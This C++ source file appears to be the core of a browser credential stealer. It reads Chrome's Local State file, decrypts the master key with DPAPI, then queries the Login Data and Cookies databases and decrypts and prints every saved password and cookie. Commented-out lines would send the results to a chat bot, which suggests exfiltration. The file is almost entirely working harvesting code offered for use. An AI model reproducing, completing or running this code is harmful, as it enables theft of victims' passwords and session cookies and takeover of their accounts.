#include "chromium_processor.hpp"

ChromiumProcessor::ChromiumProcessor()
{
    MasterKey=nullptr;
    Cookies=new vector <Cookie>;
#if defined(__WIN64__)
    string appDataLocal_path=std::experimental::filesystem::temp_directory_path().parent_path().parent_path().string();
    userdata_path=appDataLocal_path+string("\\Google\\Chrome\\User Data");
    pass_path=userdata_path+string("\\Default\\Login Data");
    cookies_path=userdata_path+string("\\Default\\Cookies");
#elif defined(__linux__)
    userdata_path=
    pass_path="~/.config/google-chrome/Default/User Data";
    cookies_path="~/.config/google-chrome/Default/Cookies";
#endif
}

ChromiumProcessor::~ChromiumProcessor()
{
    delete Cookies;
}

int ChromiumProcessor::ExtractChromiumPasswords()
{
    cout<<"ChromiumProcessor::ExtractChromiumPasswords()"<<endl;
    if(experimental::filesystem::exists(pass_path))
    {
        int rc=sqlite3_open(pass_path.c_str(), &ChromiumDB);
        if(rc!=SQLITE_OK)
        {
            cerr<<"DB Error: "<<sqlite3_errmsg(ChromiumDB)<<endl;
            return -3;
            //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
        }
        cout<<"DB is Ok."<<endl;
        //bot_sender.send(ChatID, pass.str());
    }
    else
    {
        cerr<<"File don't exists"<<pass_path<<endl;
        throw invalid_argument("wrong pass_path");
        return -2;
    }

    if(!MasterKey)
    {
        this->ExtractChromiumMasterKey();
    }

    int rc;
    unsigned long int i;
    string sql="SELECT origin_url, action_url, username_value, password_value FROM logins";
    sqlite3_stmt *pStmt;

    rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
    if(rc!=SQLITE_OK)
    {
        cerr<<"sqlite: statement failed, rc="<<rc<<endl;
        return -1;
    }

    rc=sqlite3_step(pStmt);
    //cout<<"RC: "<<rc<<endl;
    while(rc==SQLITE_ROW)
    {
        string newPW;
        cout<<sqlite3_column_text(pStmt, 0)<<endl;
        cout<<sqlite3_column_text(pStmt, 1)<<endl;
        cout<<sqlite3_column_text(pStmt, 2)<<endl;

        DATA_BLOB encryptedPass, decryptedPass;
        decryptedPass.pbData=nullptr;
        encryptedPass.cbData=sqlite3_column_bytes(pStmt, 3);
        encryptedPass.pbData=new unsigned char[encryptedPass.cbData];

        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 3), encryptedPass.cbData);

        newPW=EasyDecrypt(&encryptedPass, MasterKey);

        for(i=0; encryptedPass.pbData && i<encryptedPass.cbData; i++)
        {
            fprintf(stdout, "%.2x", encryptedPass.pbData[i]&0xFF);
        }
        fprintf(stdout, " < encryptedPass\n");
        fprintf(stdout, "%s < decryptedPass!\n", newPW.c_str());

        delete [] encryptedPass.pbData;
        if(decryptedPass.pbData)
        {
            LocalFree(decryptedPass.pbData);
        }
        rc=sqlite3_step(pStmt);
    }
    rc=sqlite3_finalize(pStmt);
    sqlite3_close(ChromiumDB);
    return 0;
}

int ChromiumProcessor::ExtractChromiumCookies()
{
    cout<<"ChromiumProcessor::ExtractChromiumCookies()"<<endl;
    if(experimental::filesystem::exists(cookies_path))
    {
        int rc=sqlite3_open(cookies_path.c_str(), &ChromiumDB);
        if(rc!=SQLITE_OK)
        {
            cerr<<"DB Error: "<<sqlite3_errmsg(ChromiumDB)<<endl;
            return -3;
            //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
        }
        cout<<"DB is Ok."<<endl;
        //bot_sender.send(ChatID, cookies.str());
    }
    else
    {
        cerr<<"File don't exists"<<cookies_path<<endl;
        throw invalid_argument("wrong cookies_path");
        return -2;
    }

    if(!MasterKey)
    {
        this->ExtractChromiumMasterKey();
    }

    int rc;
    unsigned long int i;
    string sql="SELECT host_key, name, path, encrypted_value, creation_utc, expires_utc FROM cookies";
    sqlite3_stmt *pStmt;

    rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
    if(rc!=SQLITE_OK)
    {
        cerr<<"sqlite: statement failed, rc="<<rc<<endl;
        return -1;
    }

    rc=sqlite3_step(pStmt);
    while(rc==SQLITE_ROW)
    {
        Cookie newCookie;
        newCookie.Host=string((char *)sqlite3_column_text(pStmt, 0));
        newCookie.Name=string((char *)sqlite3_column_text(pStmt, 1));
        newCookie.Path=string((char *)sqlite3_column_text(pStmt, 2));

        DATA_BLOB encryptedCookie;

        encryptedCookie.cbData=sqlite3_column_bytes(pStmt, 3);
        encryptedCookie.pbData=new unsigned char[encryptedCookie.cbData];
        memcpy(encryptedCookie.pbData, sqlite3_column_blob(pStmt, 3), encryptedCookie.cbData);

        newCookie.Value=EasyDecrypt(&encryptedCookie, MasterKey);
        if(newCookie.Value==string(""))
        {
            string cookieDataBuf;
            for(i=0; encryptedCookie.pbData!=nullptr && i<encryptedCookie.cbData; i++)
            {
                cookieDataBuf.append(1, encryptedCookie.pbData[i]);
            }
            newCookie.Value=cookieDataBuf;
        }
        delete [] encryptedCookie.pbData;
        newCookie.CreDate=sqlite3_column_int64(pStmt, 4);
        newCookie.ExpDate=sqlite3_column_int64(pStmt, 5);

        Cookies->push_back(newCookie);
        rc=sqlite3_step(pStmt);
    }
    rc=sqlite3_finalize(pStmt);
    sqlite3_close(ChromiumDB);
    return 0;
}

unsigned char *ChromiumProcessor::ExtractChromiumMasterKey()
{
    cout<<"ChromiumProcessor::ExtractChromiumMasterKey()"<<endl;
    string LocalStateFile_path=userdata_path, stMasterKey;
    if(LocalStateFile_path.find("Opera")!=string::npos)
    {
        LocalStateFile_path += "\\Opera Stable\\Local State";
    }
    else
    {
        LocalStateFile_path += "\\Local State";
    }
    if(!experimental::filesystem::exists(LocalStateFile_path))
    {
        cerr<<"file don't exists: "<<LocalStateFile_path<<endl;
        return 0;
    }
    if(LocalStateFile_path!=prevBrowser_path)
    {
        prevBrowser_path=LocalStateFile_path;
    }
    else
    {
        if(MasterKey!=nullptr)
        {
            return MasterKey;
        }
    }

    json_error_t err;
    json_t *LocalState=json_load_file(LocalStateFile_path.c_str(), 0, &err);
    if(LocalState == NULL)
    {
        fprintf(stderr, "json file is incorrect: %s\n", LocalStateFile_path.c_str());
        fprintf(stderr, "error text: %s\n", err.text);
        return 0;
    }
    json_t *os_crypt=json_object_get(LocalState, "os_crypt");
    if(os_crypt == NULL)
    {
        fprintf(stderr, "error: have no 'os_crypt' object in JSON\n");
        return(0);
    }
    if(os_crypt->type == JSON_OBJECT)
    {
        if(json_object_get(os_crypt, "encrypted_key")->type == JSON_STRING)
        {
            stMasterKey=json_string_value(json_object_get(os_crypt, "encrypted_key"));
        }
    }

    stMasterKey=base64_decode(stMasterKey);

    unsigned int keyLen=stMasterKey.length()-5;
    DATA_BLOB bRawMasterKey;
    bRawMasterKey.cbData=keyLen;
    bRawMasterKey.pbData=new unsigned char[keyLen];
    memcpy(bRawMasterKey.pbData, &stMasterKey.data()[5], keyLen);

    DATA_BLOB finalK=DPAPIDecrypt(&bRawMasterKey);
    if(finalK.cbData>0)
    {
        if(MasterKey!=nullptr)
        {
            delete [] MasterKey;
        }
        MasterKey=new unsigned char[finalK.cbData];
        memcpy(MasterKey, finalK.pbData, finalK.cbData);
    }
    delete [] bRawMasterKey.pbData;

    fprintf(stdout, "Chromium MasterKey: '");
    for(unsigned long int i=0; i<finalK.cbData; i++)
    {
        fprintf(stdout, "%.2x", MasterKey[i]&0xFF);
    }
    fprintf(stdout, "' (hex format, decrypted)\n");

    return MasterKey;
}
